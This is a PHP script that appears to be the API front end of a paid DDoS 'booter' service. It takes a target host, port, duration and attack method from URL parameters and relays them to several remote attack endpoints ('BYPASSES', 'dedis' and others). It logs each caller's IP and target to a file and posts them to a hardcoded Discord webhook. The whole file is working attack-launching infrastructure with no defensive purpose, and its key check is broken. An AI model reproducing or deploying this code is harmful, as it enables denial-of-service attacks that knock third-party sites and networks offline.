<?php
ignore_user_abort(true);
set_time_limit(1200);
date_default_timezone_set("America/New_York");

function get_ip_address()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && validate_ip($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($iplist as $ip) {
                if (validate_ip($ip))
                    return $ip;
            }
        } else {
            if (validate_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
                return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED']) && validate_ip($_SERVER['HTTP_X_FORWARDED']))
        return $_SERVER['HTTP_X_FORWARDED'];
    if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validate_ip($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validate_ip($_SERVER['HTTP_FORWARDED_FOR']))
        return $_SERVER['HTTP_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_FORWARDED']) && validate_ip($_SERVER['HTTP_FORWARDED']))
        return $_SERVER['HTTP_FORWARDED'];
    return $_SERVER['REMOTE_ADDR'];
}
function validate_ip($ip)
{
    if (strtolower($ip) === 'unknown')
        return false;
    $ip = ip2long($ip);
    if ($ip !== false && $ip !== -1) {
        $ip = sprintf('%u', $ip);
        if ($ip >= 0 && $ip <= 50331647)
            return false;
        if ($ip >= 167772160 && $ip <= 184549375)
            return false;
        if ($ip >= 2130706432 && $ip <= 2147483647)
            return false;
        if ($ip >= 2851995648 && $ip <= 2852061183)
            return false;
        if ($ip >= 2886729728 && $ip <= 2887778303)
            return false;
        if ($ip >= 3221225984 && $ip <= 3221226239)
            return false;
        if ($ip >= 3232235520 && $ip <= 3232301055)
            return false;
        if ($ip >= 4294967040)
            return false;
    }
    return true;
}


$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
$ip      = get_ip_address();
$json    = file_get_contents("http://extreme-ip-lookup.com/json/" . $ip);
$data    = json_decode($json, true);
$country = $data['country'];
$date    = date('d/m/Y h:i:s');
$myfile  = fopen("Logs/API_LOGS/apiasgasfj-gwaw.txt", "a+");
fwrite($myfile, "Logged IP: ");
fwrite($myfile, get_ip_address());
fwrite($myfile, " ($country), at ");
fwrite($myfile, $date);
fwrite($myfile, "\n");
fwrite($myfile, "Attack Sent To: ");
fwrite($myfile, $host);
fwrite($myfile, " Seconds: ");
fwrite($myfile, $time);
fwrite($myfile, " Port: ");
fwrite($myfile, $port);
fwrite($myfile, " Method: ");
fwrite($myfile, $method);
fwrite($myfile, " Using key: ");
fwrite($myfile, $key);
fwrite($myfile, "\n \n \n");
fclose($myfile);
$url = "https://discordapp.com/api/webhooks/727013454585528383/7Ud4F1sjWgPeUIoBcQ75ludiVcLNESf6sPKWZI_ULG2gjuKjAvMIoG2p_M1XG0HirPtb";
$hookObject = json_encode([
    "username" => "YWN",

    "avatar_url" => "https://media.discordapp.net/attachments/674766077267542026/675840797035200512/earh.png?width=718&height=404",

    "tts" => false,

    "embeds" => [
        [
            "title" => "YWN",

            "type" => "rich",

            "description" => "Sell Api Request",
            "url" => "https://www.instagram.com/og_hit_or_miss8",

 
            "color" => hexdec( "fd0000" ),

            "footer" => [
                "text" => "Trive Power Team",
            ],

            "thumbnail" => [
                "url" => "https://media.discordapp.net/attachments/674766077267542026/675840797035200512/earh.png?width=718&height=404"
            ],



            "fields" => [
                [
                    "name" => "Logged IP: ",
                    "value" => "$ip",
                    "inline" => false
                ],
                [
                    "name" => "Attack Sent At:",
                    "value" => "$date",
                    "inline" => true
                ],
                [
                    "name" => "Attack Sent To:",
                    "value" => "$host",
                    "inline" => true
                ],
                [
                    "name" => "Seconds:",
                    "value" => "$time",
                    "inline" => true
                ],
                [
                    "name" => "Port:",
                    "value" => "$port",
                    "inline" => true
                ],
                [
                    "name" => "Method:",
                    "value" => "$method",
                    "inline" => true
                ],
                [
                    "name" => "Using Key:",
                    "value" => "$key",
                    "inline" => true
                ],
                [
                    "name" => "Servers:",
                    "value" => "3/8",
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

if ($time > 1200){
die('Error: Cannot exceed More Then 1200 seconds');}  

$h = htmlspecialchars($_GET['host']);
$p = htmlspecialchars($_GET['port']);
$t = htmlspecialchars($_GET['time']);
$m = htmlspecialchars($_GET['method']);
$k = htmlspecialchars($_GET['key']);
if(in_array($k,$keylist)){
die("Invalid key");
} 
if($_GET["key"] == k) { 
die("TRIVETEAM");
} else {
$a = file_get_contents("http://trive.cc/API/2server.php?&key=forsell&host={$h}&port={$p}&time={$t}&method={$m}");
$a = file_get_contents("http://trive.cc/API/BYPASSES.php?&key=forsell&host={$h}&port={$p}&time={$t}&method={$m}");
$a = file_get_contents("http://trive.cc/API/im.rooted.php?&key=FATTI&host={$h}&port={$p}&time={$t}&method={$m}");
$a = file_get_contents("http://trive.cc/API/dedis.php?&key=forsell&host={$h}&port={$p}&time={$t}&method={$m}");
echo "<p><strong>Informations:</strong><br>Api Access By : TRIVE.cc</strong><br>Plan: <strong>Api access </strong><br>Seconds maximum: <strong>1200</strong><br>Concurent: <strong>unlimited</strong></p><strong>Reponse:</strong><br>Attack Was Sending $h:$p pour $t ATTACK LAUNCH.<br>To Stop The Attack &type=$t par &type=STOP.</strong></p><strong>";}
?>
